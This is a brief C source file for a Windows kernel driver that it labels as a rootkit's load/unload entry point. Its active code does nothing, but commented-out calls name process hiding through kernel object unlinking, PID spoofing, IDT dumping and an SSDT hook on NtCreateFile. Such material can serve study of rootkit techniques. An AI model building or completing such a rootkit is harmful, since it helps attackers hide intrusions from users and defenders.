/*
        driver.c

        Rootkit load/unload.
*/

#include <ntddk.h>
#include "dkom.h"
#include "lock_proc.h"
//#include "idt.h"
//#include "ssdt.h"

void driver_unload(PDRIVER_OBJECT driver_obj) {
        UNREFERENCED_PARAMETER(driver_obj);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver_obj, PUNICODE_STRING reg_path) {
        UNREFERENCED_PARAMETER(reg_path);

        driver_obj->DriverUnload = driver_unload;

        //dump_idt();

        //proc_unlink(0x492C);

        //proc_set_pid(0xB88);

        // TODO SSDT AND IDT OBSELETE!
        /*
        NtCreateFilePrototype old_ntcreatefile = NULL;

        old_ntcreatefile = 
                (NtCreateFilePrototype)hook_ssdt(0x55, (PULONG)NtCreateFile, 
                        (PULONG)hook_ntcreatefile);
        */

        return STATUS_SUCCESS;
}